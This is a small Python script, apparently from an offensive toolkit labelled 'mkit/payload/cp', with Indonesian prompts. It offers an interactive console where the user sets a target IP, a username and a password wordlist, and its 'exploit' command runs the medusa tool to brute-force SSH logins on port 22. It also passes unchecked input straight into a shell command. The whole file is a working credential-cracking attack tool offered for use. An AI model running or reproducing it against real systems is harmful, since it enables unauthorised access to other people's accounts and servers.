import os
import sys
import time

print("""
| ================= |
|  mkit/payload/cp  |
| ================= |
     """)

while True:

    pilihan = input("\033[1;31mmk\033[0m\033[1;37mit\033[0m \033[1;32m> ")
    
    if pilihan == "set ip":
        m6 = input("Masukan IP => ")
        print(f"IP => {m6}")
    elif pilihan == "help":
        print("""
        set ip : Set Target IP
        set username : Set Username Target
        set wordlist : Set Wordlist For Crack
        exploit : Run Exploit
        """)
    elif pilihan == "set username":
        m2 = input ("Masukan Username => ")
        print(f"Username => {m2}")
    elif pilihan == "set wordlist":
        m4 = input ("Masukan Wordlist => ")
        print(f"Wordlist => {m4}")
    elif pilihan == "exploit":
        os.system(f"medusa -h {m6} -n 22 -u {m2} -P {m4} -M ssh")
    
